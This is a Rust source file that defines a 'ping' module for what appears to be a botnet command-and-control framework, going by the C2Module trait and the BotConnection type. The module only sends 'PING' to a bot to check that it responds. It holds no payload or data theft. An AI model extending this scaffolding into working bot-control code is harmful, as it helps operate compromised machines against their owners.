// src/modules/ping.rs

use async_trait::async_trait;
use std::sync::Arc;

use crate::modules::types::C2Module;
use crate::communicating::types::BotConnection;

pub struct PingModule;

#[async_trait]
impl C2Module for PingModule {
    fn name(&self) -> &'static str {
        "ping"
    }

    fn description(&self) -> &'static str {
        "Ping the bot to check if it is responsive."
    }

    async fn execute(&self, bot: Arc<BotConnection>, _args: Vec<String>) -> anyhow::Result<()> {
        bot.send_message("PING").await?; // <<<<<✅ Correct call here!
        Ok(())
    }
}
